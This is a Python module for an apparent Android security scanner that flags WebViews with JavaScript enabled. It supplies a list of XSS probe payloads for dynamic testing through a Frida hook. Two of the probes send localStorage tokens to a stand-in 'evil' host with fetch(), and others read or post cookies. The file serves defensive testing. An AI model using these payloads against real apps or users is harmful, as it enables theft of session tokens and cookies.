"""D_048 — WebView XSS injection (Dynamic Testing Target)."""
from __future__ import annotations

import logging
import re

from sentinel.agents.base.base_agent import BaseAgent
from sentinel.core.finding import Finding, Severity

logger = logging.getLogger(__name__)
_WV_JS_ENABLED_RE = re.compile(r"setJavaScriptEnabled\s*\(\s*true\s*\)")
_WV_LOAD_RE = re.compile(r"\.loadUrl\s*\(|\.loadData\s*\(")
_EVAL_JS_RE = re.compile(r"\.evaluateJavascript\s*\(")
_ADDIFACE_RE = re.compile(r"\.addJavascriptInterface\s*\(")
_XSS_PROBES = [
    "javascript:alert(document.cookie)",
    "javascript:fetch('//evil/'+localStorage.getItem('token'))",
    "<script>parent.postMessage(document.cookie,'*')</script>",
    "<img src=x onerror=fetch('//evil/'+btoa(localStorage))>",
    "</title><script>alert(1)</script>",
]


class WebViewXssAgent(BaseAgent):
    AGENT_ID = "D_048"
    VULN_CLASS = "WebView XSS Injection (Dynamic Testing Target)"
    PHASE = "Phase 2"

    async def is_applicable(self) -> bool:
        return bool(
            self._context.decompiled_dir
            and self._context.decompiled_dir.exists()
        )

    async def analyze(self) -> list[Finding]:
        root = self._context.decompiled_dir
        assert root is not None
        findings: list[Finding] = []
        scanned = 0
        for path in root.rglob("*.java"):
            scanned += 1
            if scanned > 2000:
                break
            try:
                text = path.read_text(encoding="utf-8", errors="replace")
            except OSError:
                continue
            if not _WV_JS_ENABLED_RE.search(text):
                continue
            if not _WV_LOAD_RE.search(text):
                continue
            uses_eval = bool(_EVAL_JS_RE.search(text))
            uses_iface = bool(_ADDIFACE_RE.search(text))
            severity = Severity.HIGH if (uses_eval or uses_iface) else Severity.MEDIUM
            rel = str(path.relative_to(root))
            findings.append(self._make_finding(
                vuln_class=self.VULN_CLASS,
                severity=severity,
                confidence=0.70,
                recommendation=(
                    "WebView with setJavaScriptEnabled(true) and "
                    "loadUrl/loadData detected. The Frida hook will inject "
                    "5 XSS probe payloads via evaluateJavascript after "
                    "WebView onPageFinished and report any successful "
                    "execution. Replace loadUrl with same-origin only "
                    "content and remove addJavascriptInterface from "
                    "anything user-content can reach."
                ),
                evidence={
                    "file": rel,
                    "uses_evaluate_javascript": uses_eval,
                    "uses_add_javascript_interface": uses_iface,
                    "dynamic_target": True,
                    "frida_payload": {
                        "target_file": rel,
                        "xss_probes": _XSS_PROBES,
                        "safety_budget": {
                            "max_actions_total": 20,
                            "max_actions_per_sec": 2,
                            "wall_clock_budget_s": 30,
                            "max_consecutive_crashes": 3,
                        },
                    },
                },
            ))
        return findings


__all__ = ["WebViewXssAgent"]
